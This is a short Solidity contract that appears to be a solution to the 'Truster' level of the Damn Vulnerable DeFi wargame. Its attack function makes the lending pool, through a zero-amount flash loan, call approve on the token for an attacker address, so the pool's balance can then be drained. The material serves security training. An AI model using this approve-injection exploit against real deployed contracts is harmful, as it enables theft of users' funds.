// SPDX-License-Identifier: MIT

pragma solidity ^0.8.0;
import "./TrusterLenderPool.sol";
import "../DamnValuableToken.sol";

contract TrusterReceiver {
    TrusterLenderPool private immutable pool;
    DamnValuableToken public immutable token;

    constructor(address _token, address _pool) {
        pool = TrusterLenderPool(_pool);
        token = DamnValuableToken(_token);
    }

    /**
     * @dev call pool's flashloan with the follow parameters
     * amount = 0;
     * borrower = current address
     * target = DVT
     * data = approve current address to withdraw balance of the pool
     */
    function attack(uint256 amount, address attacker) external {
        // bytes memory targetData = abi.encodeWithSignature(
        //     "approve(address,uint256)",
        //     attacker,
        //     amount
        // );

        pool.flashLoan(
            0,
            address(this),
            address(token),
            abi.encodeWithSignature(
                "approve(address,uint256)",
                attacker,
                amount
            )
        );
    }

    receive() external payable {}
}
